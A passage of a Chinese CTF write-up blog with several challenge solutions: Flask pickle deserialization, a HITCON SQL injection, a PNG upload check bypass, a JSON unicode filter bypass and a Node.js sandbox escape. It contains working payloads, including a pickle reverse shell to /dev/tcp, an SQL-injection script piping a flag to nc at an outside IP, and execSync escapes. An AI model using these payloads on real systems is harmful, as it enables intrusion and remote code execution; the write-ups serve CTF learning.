<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span> <span class="token operator">=</span> u
    <span class="token keyword">return</span> <span class="token string">"/file?file=index.js"</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/file'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">file_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>
    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">or</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span> \
            <span class="token operator">or</span> <span class="token string">'.py'</span> <span class="token keyword">in</span> path <span class="token operator">or</span> <span class="token string">'.sh'</span> <span class="token keyword">in</span> path <span class="token operator">or</span> <span class="token string">'..'</span> <span class="token keyword">in</span> path <span class="token operator">or</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'disallowed'</span>

    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>
        content <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> content


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">admin_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        u <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>u<span class="token punctuation">,</span> dict<span class="token punctuation">)</span><span class="token punctuation">:</span>
            u <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>u<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>u<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'uhh?'</span>

    <span class="token keyword">if</span> u<span class="token punctuation">.</span>is_admin <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'welcome, admin'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'who are you?'</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>
<p>/proc/self/environ</p>
<pre><code>HOSTNAME=99d252572f0c
PYTHON_VERSION=3.8.2
PWD=/app
_=/usr/local/bin/python3
HOME=/root
LANG=C.UTF-8
GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
FLAG=flag_not_here
SHLVL=1
PYTHON_PIP_VERSION=20.0.2
PYTHON_GET_PIP_SHA256=421ac1d44c0cf9730a088e337867d974b91bdce4ea2636099275071878cc189e
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d59197a3c169cef378a22428a3fa99d33e080a5d/get-pip.py
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh
OLDPWD=/app</code></pre>
<p>可以看到secret_key值为<code>glzjin22948575858jfjfjufirijidjitg3uiiuuh</code>。知道secret_key之后就可以污染session，然后pickle反序列化RCE。这里的反序列化和普通的反序列化一样，并没有在opcode上进行过滤，所以解决办法也就是使用<code>__reduce__</code>进行RCE。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode
<span class="token keyword">import</span> os

User <span class="token operator">=</span> type<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>object<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'tyskill'</span><span class="token punctuation">,</span>
    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true"># 添加__reduce__方法RCE</span>
    <span class="token string">'__reduce__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1'"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>生成之后使用<strong>flask_session_cookie_manager</strong>按照格式<code>{'u':{'b':'base64字符串'}}</code>生成session替换原session访问<code>/admin</code>就可以反弹shell。</p>
<p>session。.eJwtxksOgjAUAMCrmJ4AJJBAwqIQS_gZtUpLdzwSH5ha2Agi4e66cFazkhcJVrIDEhCkvKqQ_sVlnGR2I95WI9yPTueDkqqDjF9_96TtjyCjqTWXu1zQgFOanLszOJGGHo0SxwGWCOs9s9LYf0LCTJpQPPV0Ug_WqaUdC5PpWpyHXHGmWX4rMAzJtn0BiBswYw.YI07Bg.NkAe66dAOnYTZHn9l0D-Wsetbts复制到题目中，访问/admin，报500错误，初步判断成功了。然后访问<code>/file?file=/f1ag</code>得到flag</p>
<p>注：</p>
<p>靶机是Linux环境，本地是Windows环境，这两个环境下dumps的结果中序列化字符串声明系统的标识符不同：Linux=&gt;posix；Windows=&gt;nt，需要将脚本放在Linux环境下生成序列化字符串</p>
]]></content>
  </entry>
  <entry>
    <title>HITCON:2017-SqlSoHard</title>
    <url>/2021/06/08/hitcon-2017-sqlsohard/</url>
    <content><![CDATA[<p>不是很懂过后再来看</p>
<pre><code>from random import randint
import requests

# payload = "union"
payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc 10.188.2.20 9999`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)


username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
data = {
            'username': username+payload, 
                'password': 'AAAAAA'
                }
print('ok')
r = requests.post('http://c0eea204-4994-41eb-ada6-e2b515eceae8.node3.buuoj.cn/', data=data);
print(r.content)</code></pre>
<p><img src="/2021/06/08/hitcon-2017-sqlsohard/image-20210609161557645.png" alt="image-20210609161557645"></p>
]]></content>
      <tags>
        <tag>HITCON</tag>
      </tags>
  </entry>
  <entry>
    <title>HarekazeCTF2019：Avatar Uploader 1</title>
    <url>/2021/10/18/harekazectf2019-avatar-uploader-1/</url>
    <content><![CDATA[<p><img src="/2021/10/18/harekazectf2019-avatar-uploader-1/image-20211019155802098.png" alt="image-20211019155802098"></p>
<p>要求上传像素小于256*256的png文件</p>
<p><strong>upload.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'lib/util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'lib/session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// check whether file is uploaded</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// check file size</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// check file type</span>
<span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// check file width/height</span>
<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment" spellcheck="true">// I hope this never happens...</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'What happened...? OK, the flag for part 1 is: &lt;code>'</span> <span class="token punctuation">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/code>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// ok</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.png'</span><span class="token punctuation">;</span>
<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'info'</span><span class="token punctuation">,</span> <span class="token string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>因为file_info判断为png，而getimagesize判断结构不能为png，通过了解知道file_info可以识别 png 图片( 十六进制下 )的第一行,而getimagesize 不可以,所以<strong>保留png文件头删除其余部分</strong>：</p>
<p><strong>png文件头：</strong></p>
<pre><code>89504e470d0a1a0a0000000d49484452</code></pre>
<p>在010 Editor中打开：</p>
<p><img src="/2021/10/18/harekazectf2019-avatar-uploader-1/image-20211019160027989.png" alt="image-20211019160027989"></p>
<p>上传：</p>
<p><img src="/2021/10/18/harekazectf2019-avatar-uploader-1/image-20211019160104857.png" alt="image-20211019160104857"></p>
]]></content>
  </entry>
  <entry>
    <title>HarekazeCTF：2019-encode_and_encode</title>
    <url>/2021/08/11/harekazectf-2019-encode-and-encode/</url>
    <content><![CDATA[<p>源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token comment" spellcheck="true">// no path traversal</span>
    <span class="token string">'\.\.'</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true">// no stream wrapper</span>
    <span class="token string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true">// no data exfiltration</span>
    <span class="token string">'flag'</span>
  <span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'); #body获取post数据</span>
<span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#对body变量进行json解码</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token shell-comment comment">#判断body变量是否有效，json数据要有page</span>
  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#从page中读出文件名，并读取文件</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token shell-comment comment">#检查content是否有效,即不能明文传输flag文件，利用php伪协议绕过</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// no data exfiltration!!!</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/HarekazeCTF\{.+\}/i'</span><span class="token punctuation">,</span> <span class="token string">'HarekazeCTF{&amp;lt;censored&amp;gt;}'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#如果查到content里有相关的ctf字样，则用censored替代</span>
<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'content'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#最后将json编码后的content输出</span></code></pre>
<p>在json编码中，<code>f 等价于 \u0066</code></p>
<p>json_decode会自动解析unicode编码</p>
<p><a href="https://www.branah.com/unicode-converter">https://www.branah.com/unicode-converter</a></p>
<p>UTF-16编码 最后payload<code>{ "page" : "\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}</code></p>
<p><img src="/2021/08/11/harekazectf-2019-encode-and-encode/image-20210813035032588.png" alt="image-20210813035032588"></p>
]]></content>
      <tags>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF：2020-JustEscape</title>
    <url>/2021/08/22/hfctf-2020-justescape/</url>
    <content><![CDATA[<p><img src="/2021/08/22/hfctf-2020-justescape/image-20210822202143514.png" alt="image-20210822202143514"></p>
<h5 id="run-php"><a href="#run-php" class="headerlink" title="run.php"></a>run.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token string">"code"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'code'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token keyword">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<h5 id="run-php-code-2-2b6-7-3"><a href="#run-php-code-2-2b6-7-3" class="headerlink" title="/run.php?code=(2%2b6-7)/3;"></a>/run.php?code=(2%2b6-7)/3;</h5><p><img src="/2021/08/22/hfctf-2020-justescape/image-20210822202932575.png" alt="image-20210822202932575"></p>
<p>又由于eval()函数不仅仅是php含有的，Node.js也有这个函数</p>
<h5 id="run-php-code-Error-stack"><a href="#run-php-code-Error-stack" class="headerlink" title="/run.php?code=Error().stack"></a>/run.php?code=Error().stack</h5><p><img src="/2021/08/22/hfctf-2020-justescape/image-20210822203011872.png" alt="image-20210822203011872"></p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre><code>/run.php?code=(()=%3E{%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try{%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20}catch(e){%20return%20e[`a`](()=%3E{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20}%20})()</code></pre>
<p><img src="/2021/08/22/hfctf-2020-justescape/image-20210822203208148.png" alt="image-20210822203208148"></p>
<pre><code>(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=&gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_proces`}s`}`](()=&gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()</code></pre>
]]></content>
      <tags>
        <tag>node.js沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>ISITDTU2019：EasyPHP</title>
    <url>/2021/10/07/isitdtu2019-easyphp/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9\'"`$&amp;.,|[{_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'rosé will not do it'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<ul>
<li><p>preg_match(‘/[\x00- 0-9'“`$&amp;.,|[{<em>defgops\x7F]+/i’, $</em>)J解析：</p>
</li>
<li><pre><code>\x00- 0-9                       匹配\x00到空格(\x20)，0-9的数字
'"`$&amp;.,|[{_defgops              匹配这些字符
\x7F                            匹配DEL(\x7F)字符</code></pre>
</li>
<li><p>if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )</p>
</li>
<li><p>限定提交的字符串长度小于13</p>
</li>
</ul>
<p>查看可以提交的函数：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$array</span><span class="token operator">=</span><span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回所有内置定义函数</span>
